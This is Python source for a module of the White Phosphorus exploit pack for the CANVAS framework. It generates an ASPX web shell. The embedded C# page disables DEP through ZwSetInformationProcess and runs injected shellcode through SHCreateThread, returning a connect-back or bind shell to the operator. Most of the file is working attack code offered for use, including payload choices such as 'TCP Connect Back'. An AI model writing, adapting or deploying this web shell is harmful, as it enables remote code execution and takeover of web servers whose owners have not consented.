#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################
#Standard Imports

import sys
if '.' not in sys.path: sys.path.append('.')
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import getopt
import socket
import time
import struct

# CANVAS imports
from exploitutils import *
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from MOSDEF import mosdef
from httpclientside import httpclientside

######################################################################################
NAME='.NET ASPX Shell'
DESCRIPTION='Returns a MOSDEF shell from an uploaded .aspx page. Upload the generated page to the server in a location with script execute. Request the page and enjoy your MOSDEF node.'
VERSION='1.0'
CHANGELOG="""
"""
######################################################################################
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Notes']=""""""
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['All','2003']

DEBUGNOTES="""
"""

NOTES="""
"""


######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return
PORT = 0
targets={
    0: ['All versions',0, [WINALL]]
}
######################################################################################
class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0
    
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.badstring='\0\xff'
        self.name=NAME
        self.port = PORT
        self.filename='aspxShell.aspx'
        self.version=1
        self.autoVersioned = False           
        return
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
    		# We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
    		# We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return
    
    def run(self):
        
        filedata=self.makefile()
        self.log('WP> Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        
        ret = self.wp_postExploitShellcode()
        if ret:
           return ret        
        
        return 1
        
    def makefile(self):
        filedata="""
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<script runat="server">
[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
internal static extern Int32 ZwSetInformationProcess(Int32 ProcessHandle,Int32 ProcessInformationClass,string ProcessInformation,Int32 ProcessInformationLength );

[DllImport("shlwapi.dll", SetLastError = true, ExactSpelling = true)]
internal static extern Int32 SHCreateThread(byte[] pfnThreadProc, String pData, Int32 dwFlags, Int32 pfnCallback);
   
protected void Page_Load(object sender, EventArgs e)
{
    Response.Write ("Running Shell");

    string shellcode = "SHELLCODE";
    string ptr = "\\x02\\x00\\x00";
    
    char[] chararray = shellcode.ToCharArray();
    byte[] shellcode2 = new byte[shellcode.Length];
    int intcounter;
    
    for (intcounter=0; intcounter < shellcode.Length;intcounter++)
     {
        shellcode2[intcounter] = (byte)chararray[intcounter];
    }
    
    ZwSetInformationProcess(-1, 0x22, ptr, 0x4);
    SHCreateThread(shellcode2, "none", 0, 0);        
}

</script>

<html>

</html>
        """.replace('SHELLCODE',hexify(self.shellcode))
        #print filedata
        return filedata        

if __name__=='__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
